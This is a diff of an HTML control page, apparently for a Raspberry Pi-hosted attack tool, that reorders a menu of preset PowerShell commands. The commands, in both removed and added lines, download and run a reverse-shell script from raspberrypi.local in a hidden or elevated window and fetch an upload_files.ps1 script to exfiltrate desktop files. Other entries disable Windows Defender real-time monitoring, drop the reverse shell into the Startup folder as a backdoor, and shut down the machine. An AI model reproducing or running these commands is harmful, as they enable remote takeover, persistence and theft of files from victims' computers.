@@ -308,19 +308,30 @@ function toggleExamples(){
   <div class="shellcontainer"></div>
   <div class="examples">
     <ul>
-      <li style="color:#f1c">
-        <span class="name">Extract Confidential Files</span>
-        <span class="command">IEX (New-Object Net.Webclient).DownloadString('http://raspberrypi.local/files/upload_files.ps1')</span>
-      </li>
-      <li style="color:#f1c">
+
+      <li style="color:#f43">
         <span class="name">Hide Shell Window</span>
         <span class="command">Start-Process powershell.exe -ArgumentList "IEX (New-Object Net.Webclient).DownloadString('http://raspberrypi.local/files/reverse_shell.ps1');" -WindowStyle Hidden; exit;</span>
       </li>
-      <li style="color:#f1c">
+
+      <li style="color:#0af">
+        <span class="name">Open Website</span>
+        <span class="command">Start-Process chrome.exe -ArgumentList "http://raspberrypi.local/hacking"</span>
+      </li>
+      <li style="color:#0af">
+        <span class="name">Stop Chrome Browser</span>
+        <span class="command">Stop-Process -name chrome</span>
+      </li>
+
+      <li style="color:#f82">
+        <span class="name">Extract Files from Desktop</span>
+        <span class="command">IEX (New-Object Net.Webclient).DownloadString('http://raspberrypi.local/files/upload_files.ps1')</span>
+      </li>
+      <li style="color:#fd0">
         <span class="name">Gain Elevated Priviledges</span>
         <span class="command">Start-Process powershell.exe -ArgumentList "IEX (New-Object Net.Webclient).DownloadString('http://raspberrypi.local/files/reverse_shell.ps1');" -WindowStyle Hidden -verb runas;</span>
       </li>
-      <li style="color:#f1c">
+      <li style="color:#3c4">
         <span class="name">Disable Windows AntiVirus</span>
         <span class="command">Set-MpPreference -DisableRealtimeMonitoring $true</span>
       </li>
@@ -329,24 +340,16 @@ function toggleExamples(){
         <span class="command">Stop-computer</span>
       </li>
 
-      <li style="color:#f1c">
-        <span class="name">Open Website</span>
-        <span class="command">Start-Process chrome.exe -ArgumentList "http://raspberrypi.local/hacking"</span>
-      </li>
-      <li style="color:#f1c">
-        <span class="name">Stop Chrome Browser</span>
-        <span class="command">Stop-Process -name chrome</span>
-      </li>
 
-      <li style="color:#f1c">
+      <li style="color:#3c4">
         <span class="name">Add Backdoor to Autostart</span>
         <span class="command">cd "C:\Users\testo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; WGET "http://raspberrypi.local/files/reverse_shell.ps1" -UseBasicParsing -OutFile "reverse-shell.ps1"</span>
       </li>
-      <li style="color:#f1c">
-        <span class="name">Get Folder Contents</span>
+      <li style="color:#fff">
+        <span class="name">Show Files in Current Folder</span>
         <span class="command">dir</span>
       </li>
-      <li style="color:#f1c">
+      <li style="color:#fff">
         <span class="name">Get Current Location</span>
         <span class="command">Get-Location</span>
       </li>
